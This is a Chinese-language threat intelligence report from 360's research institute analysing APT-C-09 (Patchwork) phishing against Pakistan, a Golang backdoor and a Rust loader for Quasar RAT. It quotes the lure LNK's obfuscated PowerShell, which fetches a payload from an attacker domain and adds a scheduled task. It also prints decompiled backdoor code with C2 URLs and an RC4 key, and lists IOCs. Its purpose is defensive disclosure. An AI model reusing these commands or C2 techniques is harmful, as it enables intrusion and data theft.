# APT-C-09（摩诃草）组织Golang载荷窃密分析  

原创高级威胁研究院360威胁情报中心2024年07月22日11:43北京  

# APT-C-09  

# 摩诃草  

APT-C-09（摩诃草）（又称白象、Patchwork、DroppingElephant）是一个具有南亚国家背景的APT组织，长期针对巴基斯坦等周边国家进行网络攻击活动，以窃取敏感信息为主。尽管这些年该组织历史攻击行动及使用的攻击武器被国内外安全厂商多次揭露，但仍未停止其攻击，反而有越演越烈的趋势，一直处于活跃状态。  

近期，360高级威胁研究院发现该组织针对巴基斯坦地区的攻击样本，并捕获到基于Golang的新载荷，这类攻击载荷在摩诃草的历史攻击中比较少见。此外基于后台大数据分析关联，我们还捕获到了该组织在同一时期针对同一地区散布Quasar工具进行窃密的行为。这两种攻击武器的交替出现，表明该组织针对同一目标不遗余力，并不断丰富和扩展其攻击武器。因此，在本文中我们将披露这些攻击组件，特别是Golang新载荷，以便对此类威胁有更深入的了解。  

## 一、攻击活动分析  

### 1.恶意载荷分析  

本次攻击行动使用的钓鱼文件信息如下所示：  

<html><body><table><tr><td>MD5</td><td>0aa22fa3333c891a139187442ecf0e81</td></tr><tr><td>文件名称</td><td>Quran. pdf. lnk</td></tr><tr><td>文件大小</td><td>3.78 KB （3874字节）</td></tr><tr><td>文件类型</td><td>lnk</td></tr></table></body></html>  

该lnk打开时会调用powershell执行恶意指令。  

RelativePath:..\..\..\..\..\Windows\System32\WindowsPowerShel/\v1..0\power shell.exe   
Arguments:-W""i 1 \$ProgressPreference ='Si lentlyContinue';\$a='ps';\$c='h';\$b='tt';\$d=\$c+\$b+\$a;\$e='://quranchapter. t-cdn.org/wp-content/wp-includes/docaegeegrgseffefaa/22-Quran';\$f=\$d+\$e;c'url "\$f"-0 C:\Users\Public\22 Quran.pdf :sap's C:\Users\Public\22 Quran.pdf;\$z=://guranchapter.t-cdn.org/wp-includes/javascript/juicesdafekohioshfosh fhiofh/quran';\$y=\$d+\$z;c"'url "\$y"-0"C:\Users\Public\hunt";r''e''n -Path "C:\Users\Public\hunt"-NewName "C:\User s\Public\Winver.exe";c'p''i'C:\Users\Public\22 Quran.pdf'-destination.;sch''ta''s''ks/c''r''e''a''te/Sc minut e /Tn EdgeUpdate /tr'C:\Users\Public\Winver';e''r''a''s''e \*d?. ?n?  

该指令的功能为下载诱饵文件（https[:］//quranchapter.t-cdn.org/wp-content/wp-includes/docaegeegrgseffefaa/22-Quran）和恶意载荷（https[:］//quranchapter. t-cdn. org/wp-includes/javascript/juicesdafekohioshfoshfhiofh/quran ） ,并创建计划任务维持持久化。  

部分诱饵内容如下：  

  
APT-C-09（摩诃草）组织Golang载荷窃密分析  

### 2.攻击组件分析  

lnk文件下载的恶意载荷信息如下：  

<html><body><table><tr><td>MD5</td><td>4f8bd643c59658e3d5b04d760073cbe9</td></tr><tr><td>文件名称</td><td>Winver.exe</td></tr><tr><td>文件大小</td><td>5.36 MB （5619472字节）</td></tr><tr><td>文件类型</td><td>exe</td></tr></table></body></html>  

Winver.exe是一个由 Golang 编译的恶意软件，并且带有数字签名“RUNSWITHSCISSORSLTD”，具体如下图所示。  

  

需要说明的是，我们捕获的Golang载荷除了上述签名外，还有个别样本签名为“COMPUTINGANDCODINGLIMITED”，其信息如下，该签名疑似被盗取，因此后续要提防此类签名信息的样本。  

  
APT-C-09（摩诃草）组织Golang载荷窃密分析  

另外查看Winver.exe文件的节发现存在.symtab段，．Symtab是Linux系统写ELF文件格式的一部分，猜测该样本还有对应的ELF版本。  

<html><body><table><tr><td>Nr</td><td>Virtual ...</td><td>Virtual s...</td><td>RAWD...</td><td>RAW size</td><td>Flags</td><td>Name</td><td>Firstbytes (hex)</td><td>FirstAscii 20hb...</td><td>sect.Stats</td></tr><tr><td>01ep</td><td>00001000</td><td>0027C26E</td><td>00000600</td><td>0027C400</td><td>60000020</td><td>.text</td><td>FF20476F206275696C</td><td>Gobuild ID:8...</td><td></td></tr><tr><td>02</td><td>0027E000</td><td>002854A8</td><td>0027CA00</td><td>00285600</td><td>40000040</td><td>.rdata</td><td>000000017300016901</td><td>CsOi□□F...</td><td></td></tr><tr><td>03</td><td>00504000</td><td>0009B490</td><td>00502000</td><td>0003E800</td><td>C0000040</td><td>.data</td><td>FF20476F206275696C</td><td>Gobuildinf:...</td><td></td></tr><tr><td>04</td><td>005A0000</td><td>0000E5D4</td><td>00540800</td><td>0000E600</td><td>40000040</td><td>.pdata</td><td>80100000D510000000</td><td>口 口 Z@...</td><td></td></tr><tr><td>05</td><td>005AF000</td><td>000000A8</td><td>0054EE00</td><td>00000200</td><td>40000040</td><td>.xdata</td><td>010402050403015000</td><td></td><td></td></tr><tr><td>06 im</td><td>005B0000</td><td>00000516</td><td>0054F000</td><td>00000600</td><td>CO000040</td><td>idata</td><td>A6035B000000000000</td><td>"])</td><td></td></tr><tr><td>07</td><td>005B1000</td><td>0000B526</td><td>0054F600</td><td>0000B600</td><td>42000040</td><td>.reloc</td><td>00F027000401000048</td><td>HPp</td><td></td></tr><tr><td>08</td><td>005BD000</td><td>00000004</td><td>0055AC00</td><td>00000200</td><td>42000000</td><td>.symtab</td><td>040000000000000000</td><td>口</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table></body></html>  

Winver样本执行时先获取C2的硬编码值，接着对RC4的密钥和User-Agent的值进行初始化。  

if（dword_998CA0)  
{v10=runtime_gcWriteBarrier1（qword_943820,v2,v1,v3,v4，v5,v6,v7);\*v8=v10;  
qword_943820=(__int64)&a20060102150405[11204];//https://daily-mashriq.org/goyxdrkhjilchyigflztv  
qword_943838=32LL;  
if （dword_998CA0）  
{v11=runtime_gcWriteBarrier1（qword_943830,v2,v1,v3,v4,v5,v6,v7);\*v8=v11;  
qword_943830=（_int64)"455Td41AB15tvIPAsLeevnMDgXe9IvEu";// RC4密钥  
qword_943848=25LL;  
if （dword_998CA0)  
{v12=runtime_gcWriteBarrier1（qword_943840,v2,v1，v3,v4,v5，v6,v7);\*v8=v12;  
}  
qword_943840=（_int64)"AGCYRNRWWNFZZSWWFWDYDCVDN";//"User-Agent"的值  
main_sendPing（(_int64)"AGCYRNRWwWFZZSWWFWDYDCVDN"，v2,v1，v3，v4，v5，v6，V7,（_int64)v8);  

然后使用wmic命令获取UUID的值，若获取失败，则随机生成。  

v391[0] ="csproduct";   
v391[1] =\*\t';   
v391[2] ="get";   
v391[3]=3LL;   
v391[4]="UUID";   
v391[5]=4LL;   
v12=（exec_Cmd \*）os_exec_Command(（unsigned int)wmic",4,（unsigned int)v391,3,3,a6,a7,a8,a9）;// //C:\\windows\1System32\\wbem\\wmic.exe   
v394=05_exec_ptr_Cmd_Output(v12); //UUID   
if（v394.1.tab)   
{ ptr=v394.0.ptr; len = v394.0.1en; v394.0.1en=qword_943830; v388=（（_int64（golang\*)（unsigned int，_DWORD,_DWORD，_DWORD，_DWORD,int,int，int，int，_int64，_int64， (unsignedint)&v377, qword_943830, qword_943838, V394.1.tab, v394.1.data, v13, v14, v15, v16, v341, v342, V343); v359 = v394.0.1en; v358 = v17; RandomString =main_generateRandomString(9,v394.0.1en,v17,v394.1.tab,v394.1.data,v18,v19,v20,v21,v341);  

随后获取用户名、主机名、出口IP及国家代码、系统版本及架构、进程名和进程ID等信息。  

  

将获取的信息采用RC4+Base64的方式进行加密，并将Base64结果中的“+”替换成“_”和“/”替换成“_”。  

  

将获取的基本信息进行拼接后采用post的方式发送到C2地址，此时HTTP请求头中用户代理设置为如下值“User-Agent:AGCYRNRWwWFZZSWWFWDYDCVDN”。  

  

当响应的状态码为“200”时，会读取响应数据进行解析解密，若指令为“suzckdwceefc”，则调用cmd进行命令执行，并将执行结果加密回传。  

# APT-C-09（摩诃草）组织Golang载荷窃密分析  

if（\*（_QWORD \*)result ==‘suzckdwc′&&\*(_DWORD \*)（result +8）=='eefc'） v38=qword_943830; v39=runtime_stringtoslicebyte((unsigned int)&v231,qword_943830,qword_943838,v31,v32,v34,v35,v36,v37); if（v214<=1） runtime_panicIndex(1,v38,1,v31,v32,v41,v42,v43，v44,v207,v208); V45=v234[2]; V46 =V234[3]; v47=main_decryptRC4(v39,v38,v40,v45,v46,v41,v42,v43,v44); if（v214<=3) runtime_panicIndex(3,v38,v214,v45,v46,v48,v49,v50,v51,v207,v208); V237=V234[6]; v217=v234[7]; v52=v217; main_executeCommand(v47,v38,v237,v217,v46,v48,v49,v50,v51);  

v102 =(_ptr_exec_Cmd)os_exec_Command((unsigned int)"cmd.exe",7,(unsigned int)v105, 2, 2, a6, a7,a8, a9);   
V104=V10;   
v16=runtime_convTstring(v110,a2,v11,2,2,v12,v13,v14,v15);   
\*(_QWORD \*)&v104= &RTYPE_string;   
\*(（_QWORD\*）&v104+1)=V16;   
v101 =（char \*)fmt_Sprintf（（unsigned int)"cmd.exe /C %s",13,（unsigned int)&v104,1,1,v17,v18,v19,v20）;   
p_syscall_SysProcAttr =(syscall_SysProcAttr \*)runtime_newobject(&RTYPE_syscall_SysProcAttr);   
p_syscall_SysProcAttr->HideWindow =1;   
p_syscall_SysProcAttr->CmdLine.len $=$ 13LL;  

若指令为“xlsvepfstvuv”，则使用开源库进行屏幕截屏。  

if （\*(_QWORD \*)result =='xlsvepfs′ && \*(_DwORD \*)(result + 8)=='tvuv\*if （v214<=3）runtime_panicIndex(3,12Ll,v214,v31,v32,v34,v35,v36,v37,v207,v208);V236 $=$ V234[6];  
V216 $=$ V234[7];v117 $=$ V216;  
v118 $=$ main_getss（v236,v216,（_int64)v234，v31，v32,v34，v35，v36,v37);//截屏44  

  

## 二、关联分析  

基于后台大数据分析关联，我们还发现了该组织针对同一目标使用Quasar RAT的攻击行为。其样本信息如下所示：  

<html><body><table><tr><td>MD5</td><td>1154b7d8bd2e631f8fcd50a53d6173ba</td></tr><tr><td>文件大小</td><td>238 3KB (244,504 字节)</td></tr><tr><td>文件名</td><td>msedge.exe</td></tr></table></body></html>  

msedge.exe是一个Rust编译的用于内存加载执行最终载荷的加载器，通过使用更加底层的API函数，以创建线程的方式执行ShellCode，然后通过内存加载的方式，最终执行.Net载荷。此外我们也发现了通过NtQueueApcThread执行shellcode的攻击样本，该样本与msedge.exe只是shellcode执行方式不一致，其他均一致。  

  

最终载荷是一个被严重混淆过的C#程序，经过分析该载荷属于Quasar远控程序（https://github.com/quasar/Quasar），程序名为Client.exe，该远控程序也多次被摩诃草组织使用。  

Client.exe首先使用Base64解码，以及AES-128的CBC模式解密基本的配置信息，如下表。  

<html><body><table><tr><td>ProjectName</td><td>Office04</td></tr><tr><td>Version</td><td>1. 0.0.0</td></tr><tr><td>rawHosts</td><td>172.81.60.46:1005</td></tr><tr><td>DirName</td><td>SubDir</td></tr><tr><td>FileName</td><td>Client.exe</td></tr><tr><td>Mutex</td><td>QSR_MUTEX_UCsz1CfvA68L1A002s</td></tr><tr><td>SchTaskName</td><td>Quasar Client Startup</td></tr></table></body></html>  

在解密配置信息之后，会根据用户类型的不同创建持久化，如果是管理员用户，就创建计划任务以及通过注册表HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run进行持久化，如果不是Admin用户，则只是通过注册表进行持久化。  

  

最后通过socket方式连接C2服务器，并通过事件方式用于接收数据以及执行对应的远控操作，具体远控指令如下。  

<html><body><table><tr><td>指令</td><td>含义</td></tr><tr><td>DoClientDisconnect</td><td>断开连接</td></tr><tr><td>DoClientUninstall</td><td>卸载客户端</td></tr><tr><td>GetProcesses</td><td>枚举进程</td></tr><tr><td>DoProcessKill</td><td>杀死进程</td></tr><tr><td>DoProcessStart</td><td>创建进程</td></tr><tr><td>GetDrives</td><td>获取驱动器信息</td></tr><tr><td>GetDirectory</td><td>获取目录信息和文件信息</td></tr><tr><td>DoDownloadFile</td><td>下载文件</td></tr><tr><td>DoUploadFile</td><td>上传文件</td></tr><tr><td>DoMouseEvent</td><td>鼠标事件</td></tr><tr><td>DoKeyboardEvent</td><td>键盘事件</td></tr><tr><td>GetSystemInfo</td><td>获取系统信息</td></tr><tr><td>DoShellExecute</td><td>执行Shell</td></tr><tr><td>DoPathRename</td><td>重命名</td></tr><tr><td>DoPathDelete</td><td>删除文件</td></tr><tr><td>GetStartupItems</td><td>获取启动项信息</td></tr><tr><td>DoStartupItemAdd</td><td>添加启动项</td></tr><tr><td>DoStartupItemRemove</td><td>删除启动项</td></tr><tr><td>DoDownloadFileCancel</td><td>下载文件管道</td></tr><tr><td>DoLoadRegistryKey</td><td>注册表检索</td></tr><tr><td>DoCreateRegistryKey</td><td>创建注册表键</td></tr><tr><td>DoDeleteRegistryKey</td><td>删除注册表键</td></tr><tr><td>DoRenameRegistryKey</td><td>重命名注册表键</td></tr><tr><td>DoCreateRegistryValue</td><td>设置注册表值</td></tr><tr><td>DoDeleteRegistryValue</td><td>删除注册表值</td></tr><tr><td>GetScreenshot</td><td>截图</td></tr><tr><td>DoDownloadDirectory</td><td>下载目录</td></tr></table></body></html>  

## 三、归属研判  

通过对样本整体分析，我们发现本次攻击行动与摩诃草组织之前使用的攻击手段相符合。  

1.恶意1nk的参数及使用方式和恶意载荷所携带的签名“RUNSWITHSCISSORSLTD”都与我们之前关于该组织的报道一致[1] 。  

2.本次载荷通联C2中包含“b-cdn”、“t-cdn”等字符串，这类字符串经常出现在摩诃草组织以往C2中。此外多个C2服务器使用“Let’sEncrypt”颁发的免费证书，这与之前摩诃草的BADNEWS木马服务器也类似。  

Issuer Organization:Let'sEncrypt CommonName:R3   
Subject Organization: CommonName:daily-mashriq.org  

3.Golang新载荷使用 $\mathrm{RC4+}$ Base64的算法，该类算法在该组织其他载荷中也被使用过。另外，针对同一目标使用的QuasarRAT之前也被披露过。  

4.最后结合样本上传地址为巴基斯坦，符合攻击者目标，综上将其这类攻击归属于APT-C-09（摩诃草)组织。  

# 总结  

APT-C-09（摩诃草）组织从2013年被披露后，从未停止相关攻击活动，长期针对巴基斯坦等周边国家进行攻击，在最新的攻击样本中，我们观察到该组织使用Golang编写的后门载荷，以及使用Rust编写的加载器加载Quasar的攻击组件，这都进一步揭示了其在不断演进和提升技术水平的过程中，还在积极地扩展其攻击武器，以更好地适应网络安全防御的不断升级。  

在这里提醒用户加强安全意识，切勿执行未知样本或点击来历不明的链接等操作。这些行为可能导致系统在没有任何防范的情况下被攻陷，从而导致机密文件和重要情报的泄漏。  

# 附录10C  

# MD5:  

0aa22fa3333c891a139187442ecf0e81   
4f8bd643c59658e3d5b04d760073cbe9   
dfb97438f0ec94e78a2a1e3d32bc11d5   
13dcd6f1fd44f7f15651153167b646cc   
1154b7d8bd2e631f8fcd50a53d6173ba  

# C&C:  

https: //quranchapter. t-cdn[. ]org/wp  
includes/javascript/juicesdafekohioshfoshfhiofh/quran   
https: //ruz98.b-cdn[. ］net/22   
https://daily-mashriq[. Jorg/goyxdrkhjilchyigflztv   
https: //espncrics[. Jinfo/goaimdzfecbgrjjxdamdoo   
172.81.60[.]46:1005  

[1]https: //mp. weixin. qq. com/s/SAt5NU-hCbS0D6jI8gkkFQ  

# 360高级威胁研究院  

360高级威胁研究院是360数字安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。  